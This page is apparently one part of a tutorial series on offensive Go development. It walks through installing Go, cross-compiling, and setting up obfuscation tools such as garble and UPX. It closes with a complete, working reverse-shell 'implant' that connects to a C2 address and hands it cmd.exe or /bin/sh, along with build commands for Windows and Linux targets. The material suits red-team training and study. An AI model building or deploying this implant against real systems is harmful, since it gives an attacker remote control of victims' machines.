---
showTableOfContents: true
title: "Part 5 - Practical: Setting Up Your Offensive Go Environment"
type: "page"
---

## **PART 5: PRACTICAL - SETTING UP YOUR OFFENSIVE GO ENVIRONMENT**

### **Development Environment Setup**

Let's build a professional cross-compilation environment for offensive Go development.

**Step 1: Install Go**

```bash
# Linux/macOS
wget https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz

# Add to PATH (~/.bashrc or ~/.zshrc)
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin

# Verify
go version
# Should output: go version go1.21.5 linux/amd64
```

```powershell
# Windows (PowerShell as Admin)
# Download installer from https://go.dev/dl/
# Or use chocolatey:
choco install golang

# Verify
go version
```

**Step 2: Configure for Cross-Compilation**

```bash
# Go supports cross-compilation out of the box!
# No additional setup needed for basic targets

# Verify available targets
go tool dist list

# Output includes:
# windows/amd64
# windows/386
# linux/amd64
# darwin/amd64
# ... many more
```


**Step 3: Install Offensive Development Tools**

```bash
# 1. Garble (Obfuscation)
go install mvdan.cc/garble@latest

# 2. UPX (Compression) - optional, use cautiously
# Linux
sudo apt-get install upx-ucl

# macOS
brew install upx

# 3. PE Analysis Tools
# Windows: PE-bear, CFF Explorer, Detect It Easy
# Linux: Install via wine or use alternatives

# 4. MinGW for CGO (if you need C integration)
# Linux
sudo apt-get install mingw-w64

# Verify CGO cross-compilation
CGO_ENABLED=1 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc \
  go build -o test.exe test.go
```

**Step 4: IDE Setup (GoLand Recommended)**

```
GOLAND (JetBrains):
• Best Go IDE
• Excellent debugging
• Refactoring tools
• ~$90/year (free for students)

Configuration:
1. Install Go plugin
2. Set GOROOT: /usr/local/go
3. Set GOPATH: ~/go
4. Enable Go modules
5. Configure build tags for Windows target
```

**Alternative: VS Code**

```bash
# Install VS Code Go extension
code --install-extension golang.go

# Configuration (settings.json)
{
    "go.toolsManagement.autoUpdate": true,
    "go.useLanguageServer": true,
    "go.buildFlags": ["-ldflags=-s -w"],
    "go.buildTags": "windows"
}
```


### **Your First Offensive Go Binary**

Let's build a simple but functional reverse shell, then analyze it.

**implant.go:**

```go
package main

import (
	"net"
	"os"
	"os/exec"
	"runtime"
)

func main() {
	// C2 server address
	c2 := "192.168.1.100:4444"

	// Connect to C2
	conn, err := net.Dial("tcp", c2)
	if err != nil {
		os.Exit(0)
	}
	defer conn.Close()

	// Determine shell based on OS
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh")
	}

	// Pipe I/O through connection
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Execute
	cmd.Run()
}
```

**Building for Different Targets:**

```bash
# Windows 64-bit (from Linux/Mac)
GOOS=windows GOARCH=amd64 go build -o implant_win64.exe implant.go

# Windows 32-bit
GOOS=windows GOARCH=386 go build -o implant_win32.exe implant.go

# Linux 64-bit
GOOS=linux GOARCH=amd64 go build -o implant_linux64 implant.go

# Check sizes
ls -lh implant_*
```

![different os sizes](../img/os_sizes.png)



---
[|TOC|]({{< ref "../../moc.md" >}})
[|PREV|]({{< ref "./runtime.md" >}})
[|NEXT|]({{< ref "../../moc.md" >}})